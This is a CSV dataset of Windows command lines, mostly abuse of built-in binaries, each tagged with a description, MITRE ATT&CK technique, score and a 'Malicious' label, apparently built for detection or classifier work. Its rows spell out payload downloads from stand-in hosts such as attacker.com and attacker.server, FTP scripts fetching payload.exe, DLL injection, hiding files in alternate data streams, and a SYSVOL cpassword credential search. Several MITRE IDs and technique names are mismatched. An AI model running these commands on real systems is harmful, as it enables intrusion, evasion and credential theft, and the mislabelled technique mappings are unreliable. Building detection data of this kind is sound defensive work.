Prompt,Description,LOLBin,Content,Frequency,Source,Network,Behavioural,History,MITRE ID,MITRE Technique,Score,Type
bitsadmin,Transfers files using Windows Background Intelligent Transfer Service,Yes,Files,Rare,Script,Yes,Tool Transfer,Used in malware campaigns,T1105,Ingress Tool Transfer,1,Malicious
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,Downloads files from a remote URL and stores locally,Yes,Web,Rare,User Input,Yes,Tool Transfer,Used in red team operations,T1105,Ingress Tool Transfer,0.9,Malicious
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/... > file.doc:payload.bat,Writes a malicious payload to an alternate data stream,Yes,Files,Rare,Script,Yes,Code Injection,Observed in malware chains,T1117,Regsvr32,1,Malicious
cscript c:\ads\file.txt:script.vbs,Executes script stored in alternate data stream,Yes,Scripts,Rare,Script,No,ADS Execution,Known malware evasion technique,T1564.004,Hidden Files and ADS,0.9,Malicious
cmstp.exe /ni /s https://raw.githubusercontent.com/.../Cmstp.inf,Abuses cmstp to execute remote script via INF file,Yes,Scripts,Rare,Remote,Yes,LOLBin Exploitation,Used in Cobalt Strike,T1218.003,CMSTP,1,Malicious
bash.exe -c calc.exe,Abuses WSL (bash) to launch Windows process,No,System,Rare,Script,No,Cross-platform Execution,Seen in Red Canary tests,T1059.004,Unix Shell,0.85,Malicious
ATBroker.exe /start malware,Launches custom executable using ATBroker accessibility tool,Yes,Executable,Rare,System,No,Bypass UAC,Used in privilege escalation chains,T1546.008,Accessibility Features,0.8,Malicious
bitsadmin /create 1 & bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe ...,Creates a download job to fetch sysinternals tool from the internet,Yes,Files,Rare,Script,Yes,Remote File Transfer,Seen in attacker toolkits,T1105,Ingress Tool Transfer,1,Malicious
certreq -post -config https://example.org/ ...,Forces certificate request from remote endpoint,Yes,Registry,Rare,Script,Yes,Network Exploitation,Exploited in phishing kits,T1140,Deobfuscate/Decode Files,1,Malicious
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://11.11.11.11/encoded,Creates file in system directory from URL,Yes,Files,Rare,Remote,Yes,Remote File Dropper,Seen in malware drop campaigns,T1055.001,Dynamic-link Library Injection,1,Malicious
dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \193.168.0.149\dll\wtf.dll,Abuses DNS server to load remote DLL from attacker machine,Yes,Network,Rare,Remote,Yes,Lateral Movement,Seen in internal pivoting,T1574.002,DLL Side-Loading,1,Malicious
CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt,Posts certificate request to remote server using local system file,Yes,Files,Rare,Script,Yes,Certificate Abuse,Seen in exploit kits,T1140,Deobfuscate/Decode Files,1,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://10.10.10.10/xxxxxxxxx?encodedfile,Transfers remote payload into system directory via ConfigSecurityPolicy,Yes,Files,Rare,Remote,Yes,Payload Delivery,Observed in lateral movement,T1105,Ingress Tool Transfer,1,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://11.11.11.11/xxxxxxxxx?encodedfile,Writes executable to system directory from external URL,Yes,Files,Rare,Remote,Yes,Remote Execution,Related to dropper activity,T1055,Process Injection,1,Malicious
ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://webhook.site/xxxxxxxxx?encodedfile,Writes suspicious file via URL to sensitive path,Yes,Files,Rare,Remote,Yes,Payload Deployment,Used in red team simulations,T1566,Phishing,1,Malicious
control.exe c:\windows\tasks\file.txt:evil.dll,Uses control panel to execute DLL from alternate data stream,Yes,Files,Rare,Local,No,ADS Execution,Exploited by ransomware,T1564.004,Hidden Files and ADS,0.8,Malicious
csc.exe -out:My.exe File.cs,Compiles source code into executable (can be abused),Yes,Executable,Common,User Input,No,Code Generation,Used by malware loaders,T1505.003,Compiled HTML File,0.6,Malicious
DataSvcUtil /out:C:\Windows\System32\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile,Writes executable to system32 from external resource,Yes,Files,Rare,Remote,Yes,System File Injection,Seen in APT toolchains,T1055.001,DLL Injection,1,Malicious
diskshadow.exe /s c:\test\diskshadow.txt,Automates backup operations that could hide malware,Yes,Files,Rare,Script,No,Shadow Copy Abuse,Abused in ransomware,T1003.003,NTDS,0.9,Malicious
dllhost.exe /Processid:{CLSID},"Launches DLL using CLSID, potentially sideloading",Yes,DLL,Rare,System,No,DLL Sideloading,Exploited by malware families,T1574.002,DLL Side-Loading,0.8,Malicious
dnscmd.exe dc1.lab.int /config /serverlevelplugindll \192.168.0.149\dll\wtf.dll,Modifies DNS server to load DLL from remote share,Yes,Network,Rare,Remote,Yes,Remote DLL Load,Seen in domain persistence,T1574.002,DLL Side-Loading,1,Malicious
esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o,Copies VBScript file using ESENT API tool,Yes,Files,Rare,Local,No,File Obfuscation,Occasionally used by malware,T1027,Obfuscated Files or Information,0.8,Malicious
esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o,Writes file into alternate data stream using ESENT,Yes,Files,Rare,Local,No,ADS Injection,Observed in stealth malware,T1564.004,Hidden Files and ADS,0.8,Malicious
esentutl.exe /y \live.sysinternals.com\tools\adrestore.exe /d \otherwebdavserver\webdav\adrestore.exe /o,Transfers tool across remote servers,Yes,Network,Rare,Remote,Yes,Tool Transfer,Used in red teaming,T1105,Ingress Tool Transfer,1,Malicious
esentutl.exe /y \11.11.11.11\tools\adrestore.exe /d \otherwebdavserver\webdav\adrestore.exe /o,Transfers executable between servers,Yes,Network,Rare,Remote,Yes,Remote File Injection,Seen in lateral movement,T1105,Ingress Tool Transfer,1,Malicious
eventvwr.exe,Executes snap-ins and can be used for UAC bypass,Yes,System,Rare,Local,No,Privilege Escalation,Abused in UAC bypass,T1548.002,Bypass User Account Control,0.8,Malicious
expand \webdav\folder\file.bat c:\ADS\file.bat,Expands remote file from webdav into alternate data stream,Yes,Files,Rare,Remote,Yes,ADS Write,Used in stealthy file drops,T1564.004,Hidden Files and ADS,1,Malicious
diantz.exe \remotemachine\pathToFile\file.exe c:\destinationFolder\file.cab,Compresses remote file using diantz,Yes,Files,Rare,Remote,Yes,Lateral Tool Transfer,Known in payload staging,T1105,Ingress Tool Transfer,1,Malicious
diantz.exe \11.121.12.13\pathToFile\file.exe c:\destinationFolder\file.cab,Uses UNC path to move files from another host,Yes,Files,Rare,Remote,Yes,Remote Copy,Seen in ransomware distribution,T1570,Lateral Tool Transfer,1,Malicious
diantz.exe \10.10.10.10\pathToFile\file.exe c:\destinationFolder\file.cab,Transfers executable from remote server for compression,Yes,Files,Rare,Remote,Yes,Payload Prep,Used by loaders,T1105,Ingress Tool Transfer,1,Malicious
diskshadow> exec calc.exe,Executes a program using diskshadow script context,Yes,System,Rare,Script,No,Shadow Copy Execution,Used in stealth execution chains,T1059.003,Windows Command Shell,0.9,Malicious
start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw,Launches App Installer to install app from public pastebin URL,No,Web,Rare,User Input,Yes,App Installer Abuse,Seen in social engineering,T1204.002,Malicious File,0.85,Malicious
start ms-appinstaller://?source=https://10.101.10.10/raw/tdyShwLw,Triggers App Installer from IP-hosted location,No,Web,Rare,Remote,Yes,App Installer Abuse,Reported in red team ops,T1204.002,Malicious File,0.95,Malicious
start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw,Uses App Installer with suspicious external source,No,Web,Rare,Remote,Yes,App Installer Abuse,Seen in phishing delivery,T1204.002,Malicious File,0.95,Malicious
AT.exe at 09:00 /interactive /every:m,Schedules task with interactive execution via AT,Yes,System,Rare,Local,No,Task Scheduling,"Legacy tool, often abused",T1053.002,Scheduled Task,0.8,Malicious
bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,Creates download job for tool from remote server,Yes,Files,Rare,Script,Yes,Tool Transfer,Used in attacker staging,T1105,Ingress Tool Transfer,1,Malicious
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,Uses BITS to move cmd.exe and complete job chain,Yes,Files,Rare,Script,No,LOLBin File Abuse,Used in privilege abuse,T1218.007,LOLBins,0.9,Malicious
bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset,Abuses BITS and SetNotifyCmdLine to trigger payload,Yes,Files,Rare,Script,No,LOLBin Execution,Known evasive technique,T1218.007,LOLBins,0.9,Malicious
certutil -encode inputFileName encodedOutputFileName,Encodes input file using Certutil (potential for obfuscation),Yes,Files,Rare,Local,No,File Obfuscation,Common in malware chains,T1027,Obfuscated Files,0.8,Malicious
certutil -decode encodedInputFileName decodedOutputFileName,Decodes file using Certutil (commonly abused),Yes,Files,Rare,Local,No,File Restoration,Reverses encoded payloads,T1027,Obfuscated Files,0.8,Malicious
msbuild.exe pshell.xml,Executes embedded PowerShell via malicious MSBuild XML project,Yes,Scripts,Rare,Script,No,LOLBin Execution,Popular technique in APTs,T1127.001,MSBuild,0.9,Malicious
msbuild.exe project.csproj,"Compiles and runs embedded code in .csproj, possibly weaponized",Yes,Scripts,Rare,Script,No,Code Compilation Abuse,Used by malware loaders,T1127.001,MSBuild,0.9,Malicious
Msconfig.exe -5,Launches msconfig with invalid parameter — suspicious pattern,Yes,Executable,Rare,Local,No,Parameter Abuse,Not commonly seen,T1202,Indirect Command Execution,0.8,Malicious
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE,Executes diagnostic script via msdt — often used in Follina attack,Yes,XML,Rare,Script,No,Diagnostic Hijack,Confirmed in CVE-2022-30190,T1218.004,Msdt,0.9,Malicious
mshta.exe evilfile.hta,Executes a malicious .hta application via HTML Application host,Yes,Scripts,Rare,Local,No,LOLBin Script Execution,Abused in phishing lures,T1216.001,Mshta,0.8,Malicious
"mshta.exe ""C:\ads\file.txt:file.hta""",Executes HTA file embedded in alternate data stream,Yes,Files,Rare,Local,No,ADS Execution,Used in stealth attacks,T1564.004,Hidden Files and ADS,0.8,Malicious
msiexec /quiet /i cmd.msi,Silently installs MSI that may contain payloads,Yes,Executable,Rare,Script,No,Application Install Abuse,Seen in persistence tools,T1218.007,Msiexec,0.9,Malicious
netsh.exe add helper C:\Users\User\file.dll,Adds a helper DLL via netsh for persistent command execution,Yes,DLL,Rare,Local,No,Registry/Config Injection,Used in local privilege attacks,T1546.007,Netsh Helper DLL,0.8,Malicious
odbcconf -f file.rsp,"Executes response file, may lead to command injection",Yes,Scripts,Rare,Script,No,Parameter Injection,Documented in attack chains,T1218,Signed Binary Proxy Execution,0.9,Malicious
pcalua.exe -a calc.exe,Executes arbitrary application through Program Compatibility Assistant,Yes,Executable,Rare,Local,No,LOLBin Execution,Reported in living-off-the-land attacks,T1218,Signed Binary Proxy Execution,0.8,Malicious
expand c:\ADS\file1.bat c:\ADS\file2.bat,Uses expand to write batch file to alternate data stream,Yes,Files,Rare,Local,No,ADS Abuse,Used in red team exercises,T1564.004,Hidden Files and ADS,0.8,Malicious
expand \webdav\folder\file.bat c:\ADS\file.txt:file.bat,Expands remote WebDAV script into an alternate data stream,Yes,Files,Rare,Remote,Yes,ADS Write,Seen in phishing payloads,T1564.004,Hidden Files and ADS,1,Malicious
expand \11.12.13.14\folder\file.bat c:\ADS\file.txt:file.bat,Expands batch file from IP-based UNC path to ADS,Yes,Files,Rare,Remote,Yes,File Obfuscation,Known in obfuscated delivery,T1027,Obfuscated Files,1,Malicious
expand \10.10.10.10\folder\file.bat c:\ADS\file.txt:file.bat,"Same as above, using internal IP address",Yes,Files,Rare,Remote,Yes,Stealth Payload Deployment,Red team simulation use,T1564.004,Hidden Files and ADS,1,Malicious
explorer.exe /root,Launches explorer shell with root directory view,No,System,Common,Local,No,Explorer Shell Abuse,"Minimal threat, seen in misconfigs",T1005,Data from Local System,0.55,Suspicious
Extexport.exe c:\test foo bar,"Unknown or uncommon binary used for export, potentially suspicious",No,Files,Rare,Script,No,Uncommon Binary Execution,"Rarely seen, may need analysis",T1218,Signed Binary Proxy Execution,0.85,Malicious
extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe,Uses extrac32 to extract tool to an alternate data stream,Yes,Files,Rare,Local,No,ADS Execution,Observed in dropper routines,T1564.004,Hidden Files and ADS,0.8,Malicious
extrac32 /Y /C \webdavserver\share\test.txt C:\folder\test.txt,Silent extraction of remote file over WebDAV,Yes,Files,Rare,Remote,Yes,Remote File Fetch,Seen in red team scenarios,T1105,Ingress Tool Transfer,1,Malicious
extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe,Extracts a system binary to user folder,Yes,Files,Rare,Local,No,Local File Abuse,Tool misuse observed in tests,T1218,Signed Binary Proxy Execution,0.8,Malicious
findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe,Writes filtered string to ADS using findstr,No,Files,Rare,Script,No,Data Obfuscation,Known evasive method,T1564.004,Hidden Files and ADS,0.85,Malicious
findstr /S /I cpassword \sysvol\policies*.xml,Searches for plaintext credentials in SYSVOL policy files,No,Credentials,Rare,Script,No,Credential Harvesting,Common red team tactic,T1552.006,Group Policy Preferences,0.85,Malicious
findstr /V /L W3AllLov3DonaldTrump \webdavserver\folder\file.exe > c:\ADS\file.exe,Filters and writes content to a file from remote WebDAV share,No,Files,Rare,Remote,Yes,Stealth Transfer,Seen in evasion techniques,T1020,Automated Exfiltration,0.95,Malicious
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe,Abuses forfiles to trigger calculator via system scan,Yes,Executable,Rare,Script,No,Binary Proxy Execution,Used in command injection chains,T1202,Indirect Command Execution,0.9,Malicious
"forfiles /p c:\windows\system32 /m notepad.exe /c ""c:\folder\normal.dll:evil.exe""",Uses forfiles to invoke hidden DLL in ADS,Yes,Files,Rare,Script,No,ADS DLL Execution,Known stealth trick,T1564.004,Hidden Files and ADS,0.9,Malicious
echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt,Crafts FTP script and downloads executable,No,Files,Rare,Script,Yes,Network File Transfer,Common payload delivery method,T1105,Ingress Tool Transfer,0.95,Malicious
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Creates and runs FTP batch file for malicious payload,No,Files,Rare,Script,Yes,Stealthy File Drop,Seen in legacy attacks,T1105,Ingress Tool Transfer,0.95,Malicious
"cmd.exe /c ""@echo open 11.11.11.11 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Same as above with direct IP usage,No,Files,Rare,Remote,Yes,Network Payload Drop,Observed in exploit kits,T1105,Ingress Tool Transfer,0.95,Malicious
"cmd.exe /c ""@echo open 10.10.10.10 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v""",Legacy FTP-based payload delivery with internal IP,No,Files,Rare,Remote,Yes,FTP Abuse,Noted in post-exploit scripts,T1105,Ingress Tool Transfer,0.95,Malicious
"C:\Windows\System32\DriverStore\FileRepository\igdlh64.inf_amd64_[0-9]+\GfxDownloadWrapper.exe ""URL"" ""DESTINATION FILE""",Uses legitimate Intel wrapper to download remote payload,Yes,Files,Rare,Remote,Yes,LOLBin File Drop,Seen in APT attacks,T1218,Signed Binary Proxy Execution,1,Malicious
Gpscript /logon,"Executes Group Policy script processing, potentially abused",Yes,Scripts,Rare,System,No,Policy Execution Hijack,Abused in persistent malware,T1053.005,Scheduled Task via GPO,0.8,Malicious
HH.exe http://some.url/script.ps1,Uses HTML Help executable to download and execute remote script,Yes,Scripts,Rare,Remote,Yes,LOLBin Execution,Seen in phishing and initial access,T1218.001,Signed Binary Proxy Execution,1,Malicious
HH.exe c:\windows\system32\calc.exe,"Executes local binary via hh.exe, abusing LOLBin capability",Yes,Executable,Rare,Local,No,Local Binary Proxy,Observed in evasion routines,T1218.001,Signed Binary Proxy Execution,0.8,Malicious
ie4uinit.exe -BaseSettings,Executes IE user initialization script with low visibility,Yes,Registry,Rare,Local,No,LOLBin Initialization Abuse,Known in UAC bypass techniques,T1548.002,Bypass User Account Control,0.8,Malicious
ieexec.exe http://x.x.x.x:8080/bypass.exe,Executes file from a remote URL via Internet Explorer executor,Yes,Files,Rare,Remote,Yes,Remote Execution,Used in red team post-exploitation,T1105,Ingress Tool Transfer,1,Malicious
ieexec.exe http://10.10.10.10:8080/bypass.exe,Same as above with internal IP usage,Yes,Files,Rare,Remote,Yes,Network Payload Execution,Seen in internal phishing,T1105,Ingress Tool Transfer,1,Malicious
ieexec.exe http://11.11.11.11:8080/bypass.exe,Uses IE execution engine to run remote payload,Yes,Files,Rare,Remote,Yes,LOLBin Exploitation,Documented in threat research,T1218.005,Mshta,1,Malicious
ilasm.exe C:\public\test.txt /exe,Assembles IL code into an executable binary,Yes,Executable,Rare,User Input,No,Compilation Abuse,Can be used for payload crafting,T1027.004,Compile After Delivery,0.8,Malicious
InfDefaultInstall.exe Infdefaultinstall.inf,Executes INF installation script for driver/config abuse,Yes,Registry,Rare,Script,No,File Execution Hijack,Abused to run unsigned code,T1218.010,Installer Packages,0.9,Malicious
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll,Executes .NET DLL via installer utility,Yes,DLL,Rare,Script,No,DLL Sideload,Widely abused LOLBin,T1218.004,InstallUtil,0.9,Malicious
jsc.exe scriptfile.js,Compiles JavaScript into .NET executable,Yes,Scripts,Rare,User Input,No,Code Compilation,Used in dropper behavior,T1027.004,Compile After Delivery,0.8,Malicious
makecab c:\ADS\autoruns.exe c:\ADS\cabtest.txt:autoruns.cab,Uses makecab to compress a binary into an alternate data stream,Yes,Files,Rare,Local,No,ADS Compression,Abused in stealth malware packing,T1564.004,Hidden Files and ADS,0.8,Malicious
makecab \webdavserver\webdav\file.exe C:\Folder\file.cab,Compresses executable from WebDAV share using makecab,Yes,Files,Rare,Remote,Yes,Network Compression,Known in staging techniques,T1105,Ingress Tool Transfer,1,Malicious
makecab \10.10.10.10\webdav\file.exe C:\Folder\file.cab,Same technique using IP-based WebDAV share,Yes,Files,Rare,Remote,Yes,File Transfer via LOLBin,Seen in APT operations,T1105,Ingress Tool Transfer,1,Malicious
MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll,Injects malicious DLL into running process via PID,Yes,DLL,Rare,Script,No,DLL Injection,Used in reflective loading attacks,T1055.001,DLL Injection,0.9,Malicious
"Mavinject.exe 4172 /INJECTRUNNING ""c:\ads\file.txt:file.dll""",Injects DLL from ADS into a live process,Yes,DLL,Rare,Script,No,ADS DLL Injection,Advanced stealth method,T1564.004,Hidden Files and ADS,0.9,Malicious
Microsoft.Workflow.Compiler.exe tests.xml results.xml,Executes compiled workflow from XML input,No,XML,Rare,Script,No,Execution via Workflow Compiler,Seen in niche delivery tools,T1059,Command and Scripting Interpreter,0.85,Malicious
Microsoft.Workflow.Compiler.exe tests.txt results.txt,"Tries to compile non-XML file, suspicious behavior",No,Files,Rare,Script,No,Suspicious File Handling,May indicate misuse,T1202,Indirect Command Execution,0.85,Malicious
mmc.exe -Embedding c:\path\to\test.msc,Embeds console view from malicious MSC file,Yes,Registry,Rare,Local,No,Signed Binary Hijack,Used in persistence,T1547.010,Component Object Model Hijacking,0.8,Malicious
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\temp\beacon.exe,Uses Microsoft Defender CLI to download payload,Yes,Files,Rare,Remote,Yes,LOLBin Download Abuse,Confirmed in red team reports,T1218,Signed Binary Proxy Execution,1,Malicious
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\temp\nicefile.txt:evil.exe,Downloads payload directly into ADS using Defender binary,Yes,Files,Rare,Remote,Yes,LOLBin ADS Download,Observed in evasive campaigns,T1564.004,Hidden Files and ADS,1,Malicious
Pcwrun.exe c:\temp\beacon.exe,Executes payload through PCW process context,Yes,Executable,Rare,Local,No,Stealth Process Launch,Used in red team post-exploit,T1059.003,Windows Command Shell,0.8,Malicious
pktmon.exe start --etw,Starts packet monitor with ETW — can be used for stealth sniffing,No,Network,Rare,Local,No,Network Monitoring,Seen in network recon efforts,T1040,Network Sniffing,0.75,Malicious
pnputil.exe -i -a C:\Users\hai\Desktop\mo.inf,Installs unsigned driver through driver installer utility,Yes,Driver,Rare,Script,No,Driver Abuse,Used in privilege escalation,T1543.003,Windows Service,0.9,Malicious
Presentationhost.exe C:\temp\Evil.xbap,Executes malicious .xbap through WPF presentation host,Yes,Scripts,Rare,Local,No,GUI App Execution Abuse,Used for stealth GUI launching,T1218,Signed Binary Proxy Execution,0.8,Malicious
print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe,Abuses print command to drop executable in ADS,No,Files,Rare,Local,No,Alternate Data Execution,Seen in stealth deployments,T1564.004,Hidden Files and ADS,0.75,Malicious
print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe,Copies file using print command for stealth,No,Files,Rare,Local,No,File Masquerading,Rare tactic in stealth malware,T1564,Hide Artifacts,0.75,Malicious
